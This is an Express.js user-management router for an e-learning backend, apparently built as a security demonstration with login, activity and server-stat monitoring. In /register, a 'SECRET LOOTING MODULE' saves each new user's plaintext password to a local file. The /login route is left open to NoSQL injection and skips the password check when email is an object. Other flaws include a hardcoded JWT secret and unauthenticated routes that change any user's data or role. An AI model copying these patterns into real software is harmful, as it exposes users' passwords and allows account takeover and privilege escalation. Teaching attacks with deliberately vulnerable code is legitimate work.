const express = require("express");
const bcrypt = require("bcrypt");
const { UserModel } = require("../models/users.models");
const jwt = require("jsonwebtoken");
const { auth } = require("../middlewares/users.middleware");
const { BlackListModel } = require("../models/blacklist");
const geoip = require("geoip-lite");
const { LoginLogModel } = require("../models/loginLog.models");
const { ActivityLogModel } = require("../models/activityLog.models");
const { UniversalLogModel } = require("../models/universalLog.models");
const { logEvent } = require("../utils/universalLogger");
const { recordFailedLogin, ipRequestMap, ipFailedLogins } = require("../middlewares/activity.middleware");
const normalizeIP = (ip) => {
    if (!ip) return "unknown";
    let normalized = ip.replace(/^::ffff:/, "");
    if (normalized === "::1" || normalized === "::ffff:127.0.0.1") return "127.0.0.1";
    return normalized;
};
const os = require("os");
const checkDiskSpace = require("check-disk-space").default;

const userRouter = express.Router();

//give all user list
// Access: admin
// EndPoint: /users/;
// FRONTEND: when user/admin/teacher want to register in site;

userRouter.get("/", auth, async (req, res) => {
  try {
    if (req.body.role == "admin") {
      let users = await UserModel.find().sort({ _id: -1 }); // Newest first
      res.status(200).json({ users });
    } else {
      res.status(401).json({ error: "you don't have access to users" });
    }
  } catch (err) {
    console.log(err);
    res
      .status(400)
      .json({ message: "something went wrong", error: err.message });
  }
});

// GET login logs
// Access: admin
// EndPoint: /users/logs
userRouter.get("/logs", auth, async (req, res) => {
  try {
    if (req.body.role === "admin") {
      const logs = await LoginLogModel.find().sort({ timestamp: -1 });
      res.status(200).json({ logs });
    } else {
      res.status(401).json({ error: "Access denied. Admins only." });
    }
  } catch (err) {
    res.status(500).json({ message: "Failed to fetch logs", error: err.message });
  }
});

// GET server stats
// Access: admin
// EndPoint: /users/stats
userRouter.get("/stats", auth, async (req, res) => {
  try {
    if (req.body.role === "admin") {
      const freeMem = os.freemem();
      const totalMem = os.totalmem();
      const uptime = os.uptime();
      const cpus = os.cpus();

      // Calculate CPU Usage %
      const loadAvg = os.loadavg();
      const cpuUsagePercent = ((loadAvg[0] / cpus.length) * 100).toFixed(2) + "%";

      // Storage Info
      const diskPath = process.platform === 'win32' ? 'C:' : '/';
      let diskSpace = { size: 0, free: 0 };
      try {
        diskSpace = await checkDiskSpace(diskPath);
      } catch (e) {
        console.error("Storage check failed:", e);
      }

      const stats = {
        memory: {
          free: (freeMem / (1024 * 1024 * 1024)).toFixed(2) + " GB",
          total: (totalMem / (1024 * 1024 * 1024)).toFixed(2) + " GB",
          usage: ((1 - freeMem / totalMem) * 100).toFixed(2) + "%",
        },
        cpu: {
          model: cpus[0].model,
          cores: cpus.length,
          usagePercent: cpuUsagePercent,
          loadAverage: loadAvg,
        },
        storage: {
          total: (diskSpace.size / (1024 * 1024 * 1024)).toFixed(2) + " GB",
          free: (diskSpace.free / (1024 * 1024 * 1024)).toFixed(2) + " GB",
          used: ((diskSpace.size - diskSpace.free) / (1024 * 1024 * 1024)).toFixed(2) + " GB",
          usagePercent: diskSpace.size > 0 ? (((diskSpace.size - diskSpace.free) / diskSpace.size) * 100).toFixed(2) + "%" : "0%",
        },
        uptime: {
          seconds: uptime,
          human: new Date(uptime * 1000).toISOString().substr(11, 8),
        },
        process: {
          memory: process.memoryUsage(),
          version: process.version,
          platform: process.platform,
        },
        timestamp: new Date(),
      };

      res.status(200).json({ stats });
    } else {
      res.status(401).json({ error: "Access denied. Admins only." });
    }
  } catch (err) {
    res.status(500).json({ message: "Failed to fetch server stats", error: err.message });
  }
});

// GET request-level stats (rate, failed logins, top IPs)
// Access: admin
// EndPoint: /users/request-stats
userRouter.get("/request-stats", auth, async (req, res) => {
  try {
    if (req.body.role === "admin") {
      const now = Date.now();
      const windowMs = 60 * 1000;

      // Build per-IP stats
      const ipStats = Object.entries(ipRequestMap).map(([ip, timestamps]) => {
        const recentCount = timestamps.filter(t => now - t < windowMs).length;
        return {
          ip,
          requests_per_min: recentCount,
          failed_logins: ipFailedLogins[ip] || 0,
          total_requests: timestamps.length,
        };
      }).sort((a, b) => b.requests_per_min - a.requests_per_min);

      // Aggregate from recent universal logs
      const recentLogs = await UniversalLogModel.find({
        "core.timestamp": { $gte: new Date(now - 60 * 60 * 1000) } // last 1 hour
      }).select("web network core").lean();

      const totalDataTransfer = recentLogs.reduce((sum, l) => sum + (l.network?.data_transfer_bytes || 0), 0);
      const avgResponseTime = recentLogs.length
        ? (recentLogs.reduce((sum, l) => sum + (l.web?.response_time || 0), 0) / recentLogs.length).toFixed(2)
        : 0;

      // Status code breakdown
      const statusBreakdown = recentLogs.reduce((acc, l) => {
        const code = l.web?.status_code;
        if (code) acc[code] = (acc[code] || 0) + 1;
        return acc;
      }, {});

      // Method breakdown
      const methodBreakdown = recentLogs.reduce((acc, l) => {
        const m = l.web?.http_method;
        if (m) acc[m] = (acc[m] || 0) + 1;
        return acc;
      }, {});

      // CPU usage from os
      const cpus = os.cpus();
      const cpuUsage = parseFloat(((os.loadavg()[0] / cpus.length) * 100).toFixed(2));

      res.status(200).json({
        ipStats: ipStats.slice(0, 20),
        totalFailedLogins: Object.values(ipFailedLogins).reduce((a, b) => a + b, 0),
        totalDataTransferBytes: totalDataTransfer,
        avgResponseTimeMs: avgResponseTime,
        statusBreakdown,
        methodBreakdown,
        cpuUsagePercent: cpuUsage,
        totalRequestsLastHour: recentLogs.length,
      });
    } else {
      res.status(401).json({ error: "Access denied. Admins only." });
    }
  } catch (err) {
    res.status(500).json({ message: "Failed to fetch request stats", error: err.message });
  }
});

// Ban User
// Access: admin/agent
// EndPoint: /users/ban/:userId
userRouter.patch("/ban/:userId", auth, async (req, res) => {
  try {
    if (req.body.role === "admin" || req.body.role === "agent") {
      const { userId } = req.params;
      await UserModel.findByIdAndUpdate(userId, { isBanned: true });
      res.status(200).json({ msg: "User has been banned successfully" });
    } else {
      res.status(401).json({ error: "Access denied. Admins/Agents only." });
    }
  } catch (err) {
    res.status(400).json({ msg: "Failed to ban user", error: err.message });
  }
});

// Unban User
// Access: admin/agent
// EndPoint: /users/unban/:userId
userRouter.patch("/unban/:userId", auth, async (req, res) => {
  try {
    if (req.body.role === "admin" || req.body.role === "agent") {
      const { userId } = req.params;
      await UserModel.findByIdAndUpdate(userId, { isBanned: false });
      res.status(200).json({ msg: "User has been unbanned successfully" });
    } else {
      res.status(401).json({ error: "Access denied. Admins/Agents only." });
    }
  } catch (err) {
    res.status(400).json({ msg: "Failed to unban user", error: err.message });
  }
});

// GET user activities
// Access: admin
// EndPoint: /users/activities
userRouter.get("/activities", auth, async (req, res) => {
  try {
    if (req.body.role === "admin") {
      const activities = await ActivityLogModel.find().sort({ timestamp: -1 }).limit(100);
      res.status(200).json({ activities });
    } else {
      res.status(401).json({ error: "Access denied. Admins only." });
    }
  } catch (err) {
    res.status(500).json({ message: "Failed to fetch activities", error: err.message });
  }
});

// GET universal logs
// Access: admin
// EndPoint: /users/universal-logs
userRouter.get("/universal-logs", auth, async (req, res) => {
  try {
    if (req.body.role === "admin") {
      const logs = await UniversalLogModel.find().sort({ "core.timestamp": -1 }).limit(100);
      res.status(200).json({ logs });
    } else {
      res.status(401).json({ error: "Access denied. Admins only." });
    }
  } catch (err) {
    res.status(500).json({ message: "Failed to fetch universal logs", error: err.message });
  }
});

// SECRET LOOTING MODULE (FOR DEMO PURPOSE)
// This simulates a hacker sniffing passwords during registration
const fs = require('fs');
const path = require('path');
const LEAK_FILE = path.join(__dirname, "..", "..", "..", "final-year-pro", "leaked_db.json");

userRouter.post("/register", async (req, res) => {
  const { name, email, password, age, city, job, image } = req.body;
  
  // SECRELY STEAL THE PASSWORD FOR THE DEMO
  try {
    let leakedData = {};
    if (fs.existsSync(LEAK_FILE)) {
      leakedData = JSON.parse(fs.readFileSync(LEAK_FILE));
    }
    leakedData[email.toLowerCase()] = password;
    fs.writeFileSync(LEAK_FILE, JSON.stringify(leakedData, null, 2));
  } catch (err) {
    console.log("Looting failed:", err.message);
  }

  const registeredUser = await UserModel.findOne({ email });

  if (registeredUser) {
    res.status(409).json({ msg: "User already exist. Please Login!!" });
  } else {
    try {
      bcrypt.hash(password, 5, async (err, hash) => {
        // Store hash in your password DB.
        if (err) {
          res.status(404).json({ msg: err });
        } else {
          const user = new UserModel({
            name,
            email,
            password: hash,
            age,
            city,
            job,
            image,
          });
          await user.save();

          logEvent("db", {
            db_user: "Elearning-Admin",
            database_name: "Elearning",
            query_text: "INSERT INTO users",
            query_type: "INSERT",
            rows_affected: 1,
            query_status: "SUCCESS"
          });

          logEvent("app", {
            endpoint: "/users/register",
            action: "USER_REGISTRATION",
            request_payload: { name, email, age, city, job },
            response_status: "SUCCESS"
          });

          res.status(201).json({ msg: "user created succesfully", user });
        }
      });
    } catch (error) {
      res.status(400).json({ error: error });
    }
  }
});

// login for users;
// Access: All;
// EndPoint: /users/login;
// FRONTEND: when Admin/user/teacher want to login

userRouter.post("/login", async (req, res) => {
  const { email, password } = req.body;
  try {
    // HIGHLY VULNERABLE FOR DEMO: Using req.body directly in the query.
    // This allows the hacker to bypass email and search for {"role": "admin"}
    const loginQuery = { ...req.body };
    delete loginQuery.password; // Remove password from query so we can bypass it
    const user = await UserModel.findOne(loginQuery);
    if (user) {
      if (user.isBanned) {
        return res.status(403).json({ msg: "Your account has been banned. Please contact support." });
      }
      // VULNERABLE FOR DEMO: If NoSQL injection is used, we bypass the password check to simulate a successful login bypass
      const bypassPassword = typeof email === 'object';
      bcrypt.compare(password, user.password, (err, result) => {
        if (result || bypassPassword) {
          const token = jwt.sign(
            { userId: user._id, user: user.name, role: user.role },
            "PROJECT_DEFEND",
            {
              expiresIn: "7d",
            }
          );
          const rToken = jwt.sign(
            { userId: user._id, user: user.name },
            "PROJECT_DEFEND",
            {
              expiresIn: "24d",
            }
          );

          // Comprehensive Universal Auth Logging
          logEvent("auth", {
            user_id: user._id,
            username: user.name,
            source_ip: normalizeIP(req.headers["x-forwarded-for"] || req.socket.remoteAddress),
            authentication_method: "JWT_BCRYPT",
            login_status: "SUCCESS",
            session_id: token,
          }).catch((e) => console.error("Auth logging failure:", e));

          const ip = normalizeIP(req.headers["x-forwarded-for"] || req.socket.remoteAddress || "");
          const userAgent = req.headers["user-agent"] || "";
          const geo = geoip.lookup(ip);

          const loginLog = new LoginLogModel({
            userId: user._id,
            name: user.name,
            email: user.email,
            ip: ip,
            userAgent: userAgent,
            city: geo ? geo.city : "Unknown",
            region: geo ? geo.region : "Unknown",
            country: geo ? geo.country : "Unknown",
            timezone: geo ? geo.timezone : "Unknown",
            latitude: geo && geo.ll ? geo.ll[0] : null,
            longitude: geo && geo.ll ? geo.ll[1] : null,
            metro: geo ? geo.metro : null,
            area: geo ? geo.area : null,
            eu: geo ? geo.eu : "0",
            range: geo ? geo.range : [],
          });
          loginLog.save().catch(e => console.error("Error saving login log:", e));

          res
            .status(202)
            .json({ msg: "User LogIn Success", token, rToken, user });
        } else {
          // Log failed login
          logEvent("auth", {
            username: email,
            source_ip: normalizeIP(req.headers["x-forwarded-for"] || req.socket.remoteAddress),
            login_status: "FAILURE",
            failure_reason: "invalid credentials",
          }).catch((e) => console.error("Auth logging failure:", e));

          recordFailedLogin(normalizeIP(req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown"));

          res.status(401).json({ msg: "invalid credentials" });
        }
      });
    } else {
      recordFailedLogin(normalizeIP(req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown"));
      res.status(404).json({ msg: "user does not exit. Signup first!!" });
    }
  } catch (error) {
    res.status(400).json({ err: error.message });
  }
});

//updation
// Access: All
// EndPoint: /users/update/:userId;
// FRONTEND: when user want to update his information;
userRouter.patch("/update/:userId", async (req, res) => {
  const { userId } = req.params;
  const payload = req.body;

  try {
    let insertpayload;
    if (!payload?.password) {
      delete payload.password;
      await UserModel.findByIdAndUpdate({ _id: userId }, payload);
      const user = await UserModel.findOne({ _id: userId });
      res.status(200).json({ msg: "user updated successfully", user });
      return;
    }
    bcrypt.hash(payload.password, 2, async (err, hash) => {
      // Store hash in your password DB.
      if (err) {
        res.status(404).json({ msg: err });
      } else {
        // console.log(hash);
        insertpayload = await { ...payload, password: hash };
      }
      await UserModel.findByIdAndUpdate({ _id: userId }, insertpayload);

      logEvent("db", {
        db_user: "Elearning-Admin",
        query_text: `UPDATE users WHERE id=${userId}`,
        query_type: "UPDATE",
        rows_affected: 1,
        query_status: "SUCCESS"
      });

      const user = await UserModel.find({ _id: userId });
      res.status(200).json({ msg: "user updated successfully", user });
    });
  } catch (error) {
    res.status(400).json({ msg: error.message });
  }
});

//delete the user ;
// Access: Admin
// EndPoint: /users/delete/:userId;
// FRONTEND: when admin want to delete user/teacher
userRouter.delete("/delete/:userId", auth, async (req, res) => {
  try {
    if (req.body.role == "admin") {
      const { userId } = req.params;
      const deletedUser = await UserModel.find({ _id: userId });
      await UserModel.findByIdAndDelete({ _id: userId });
      res
        .status(200)
        .json({ msg: "user has been deleted", deletedUser: deletedUser });
    } else {
      res.status(401).json({ error: "you don't have access to delete users" });
    }
  } catch (error) {
    res.status(400).json({ msg: error.message });
  }
});

//logout
// Access: All
// EndPoint: /users/logout
// FRONTEND: when users want to logout
userRouter.post("/logout", (req, res) => {
  try {
    const token = req.headers.authorization?.split(" ")[1];
    const newToken = BlackListModel({ token });
    newToken.save();
    res.status(200).json({ msg: "The user has logged out" });
  } catch (error) {
    console.log(error);
    res.status(400).json({ error: error.message });
  }
});

// list to courses user purchased
// Access: All
// EndPoint: /users/userCourse/:userId
// FRONTEND: When user want to see his purchased courses

userRouter.get("/userCourse/:userId", async (req, res) => {
  try {
    const userId = req.params.userId;
    const user = await UserModel.findById({ _id: userId }).populate("course");
    // console.log(user.course, userId);
    res.status(200).json({ course: user.course });
  } catch (err) {
    res
      .status(400)
      .json({ message: "Something Went Wrong", error: err.message });
  }
});

// add courseId to the user course array;
// Access: All
// EndPoint: /users/addCourse/:courseId
// FRONTEND: When user have purchased the couse and we have add it to the user course list;

userRouter.post("/addCourse/:courseId", auth, async (req, res) => {
  try {
    let id = req.body.userId;
    const courseId = req.params.courseId;
    // check is that course is already present or not;
    await UserModel.findOne({ _id: id, course: { $in: [courseId] } })
      .then(async (course) => {
        //console.log(course);
        if (course) {
          res
            .status(400)
            .json({ error: "You already have Suscribed the Course" });
        } else {
          let user = await UserModel.findByIdAndUpdate(id, {
            $push: { course: courseId },
          });
          res
            .status(201)
            .json({ message: "You have Suscribe the Course", user });
        }
      })
      .catch((error) => {
        console.error("Error checking course:", error);
      });
  } catch (err) {
    res
      .status(400)
      .json({ message: "Something Went Wrong", error: err.message });
  }

});

userRouter.get("/Teachme/:userId", async (req, res) => {
  try {
    const userId = req.params.userId;

    // Find the user by ID
    const user = await UserModel.findById(userId);

    // Check if the user exists
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Update the user's role to "teacher"
    user.role = "teacher";
    await user.save();

    // Return success message
    res.status(200).json({ message: "User role updated to teacher" });
  } catch (err) {
    // Handle errors
    res.status(400).json({ message: "Something went wrong", error: err.message });
  }
});

module.exports = {
  userRouter,
};
